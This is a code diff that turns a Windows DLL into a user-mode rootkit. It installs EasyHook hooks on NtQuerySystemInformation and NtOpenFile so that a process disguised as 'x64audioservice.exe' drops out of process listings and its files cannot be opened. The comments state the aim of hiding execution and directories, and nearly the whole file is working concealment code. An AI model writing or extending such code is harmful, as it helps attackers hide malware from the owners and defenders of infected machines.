@@ -1,9 +1,23 @@
+// Windows Header Files:
 #include <windows.h>
-#include "lib/mhook-lib/mhook.h"
+#include <winternl.h>
+// Hooking library
+#include <easyhook.h>
+
+// Setup easyhook
+#if _WIN64
+#pragma comment(lib, "EasyHook64.lib")
+#else
+#pragma comment(lib, "EasyHook32.lib")
+#endif
 
 // Defines and typedefs
+#ifndef UNICODE
+#define UNICODE
+#endif
 #define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
 #define E404 ((NTSTATUS)0xC000000FL)
+
 typedef struct _MY_SYSTEM_PROCESS_INFORMATION
 {
 	ULONG NextEntryOffset;
@@ -19,10 +33,10 @@ typedef struct _MY_SYSTEM_PROCESS_INFORMATION
 } MY_SYSTEM_PROCESS_INFORMATION, *P_MY_SYSTEM_PROCESS_INFORMATION;
 
 typedef NTSTATUS (WINAPI *PNT_QUERY_SYSTEM_INFORMATION)(
-				__in SYSTEM_INFORMATION_CLASS SystemInformationCLass,
-				__inout PVOID SystemInformation,
-				__in ULONG SystemInformationLength,
-				__out_opt PULONG ReturnLength);
+				SYSTEM_INFORMATION_CLASS SystemInformationCLass,
+				PVOID SystemInformation,
+				ULONG SystemInformationLength,
+				PULONG ReturnLength);
 
 typedef NTSYSCALLAPI NTSTATUS (WINAPI *PNT_OPEN_FILE)(
 				PHANDLE FileHandle,
@@ -32,17 +46,15 @@ typedef NTSYSCALLAPI NTSTATUS (WINAPI *PNT_OPEN_FILE)(
 				ULONG ShareAccess,
 				ULONG OpenOptions
 				);
+// Target program to hide
+const wchar_t* targetExe = L"x64audioservice.exe";
 
 // Addresses of the original functions
-PNT_QUERY_SYSTEM_INFORMATION O_NtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)::GetProcAddress(::GetModuleHandle(L"ntdll"), "NtQuerySystemInformation");
-PNT_OPEN_FILE O_NtOpenFile = (PNT_OPEN_FILE)::GetProcAddress(::GetModuleHandle(L"ntdll"), "NtOpenFile")
+PNT_QUERY_SYSTEM_INFORMATION O_NtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)::GetProcAddress(::GetModuleHandle("ntdll"), "NtQuerySystemInformation");
+PNT_OPEN_FILE O_NtOpenFile = (PNT_OPEN_FILE)::GetProcAddress(::GetModuleHandle("ntdll"), "NtOpenFile");
 
 // Hooked functions
-NTSTATUS WINAPI H_NtQuerySystemInformation(
-				__in SYSTEM_INFORMATION_CLASS SystemInformationCLass,
-				__inout PVOID SystemInformation,
-				__in ULONG SystemInformationLength,
-				__out_opt PULONG ReturnLength)
+NTSTATUS WINAPI H_NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationCLass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
 {
 	// Run the original function to get some systeminfo
 	NTSTATUS result = O_NtQuerySystemInformation(SystemInformationCLass, SystemInformation, SystemInformationLength, ReturnLength);
@@ -62,7 +74,7 @@ NTSTATUS WINAPI H_NtQuerySystemInformation(
 			next = (P_MY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)curr + curr->NextEntryOffset);
 			
 			// See if the next imageName is x64audioservice.exe
-			if(!wcsncmp(next->ImageName.Buffer, L"x64audioservice.exe", next->ImageName.Length))
+			if(!wcsncmp(next->ImageName.Buffer, targetExe, next->ImageName.Length))
 			{
 				// Delete this entry
 				if(next->NextEntryOffset == 0)
@@ -94,7 +106,7 @@ NTSTATUS WINAPI H_NtOpenFile(
 	// Result to return
 	NTSTATUS result;
 	// Inspect ObjectAttributes, see if our folders are being opened
-	if(!wcsncmp(ObjectAttributes.ObjectName->Buffer, "dir", ObjectAttributes.ObjectName->Length))
+	if(!wcsncmp(ObjectAttributes->ObjectName->Buffer, targetExe, ObjectAttributes->ObjectName->Length))
 	{
 		// Folders are being opened, return E404
 		result = E404;
@@ -113,16 +125,26 @@ NTSTATUS WINAPI H_NtOpenFile(
 // Entry point
 BOOL WINAPI DLLMain(HINSTANCE hInst, DWORD reason, LPVOID reserved)
 {
-	swtich(reason)
+	// Set up hook handlers
+	HOOK_TRACE_INFO queryHook, fileHook;
+	queryHook = {NULL};
+	fileHook = {NULL};
+	switch(reason)
 	{
 		case DLL_PROCESS_ATTACH:
 			// If startup reg key exists, delete it			
 			// Hook ntquerysysteminformation function to hide execution
+			LhInstallHook((PVOID*) &O_NtQuerySystemInformation, H_NtQuerySystemInformation, NULL, &queryHook);
 			// Hook ntopenfile function to hide my directories
+			LhInstallHook((PVOID*) &O_NtOpenFile, H_NtOpenFile, NULL, &fileHook);
 			// Shutdown handler
 		break;
 		case DLL_PROCESS_DETACH:
 			// Unhook all the functions
+			LhUninstallHook(&queryHook);
+			LhUninstallHook(&fileHook);
+			// Uninstall hooks
+			LhWaitForPendingRemovals();
 		break;
 	}
 	
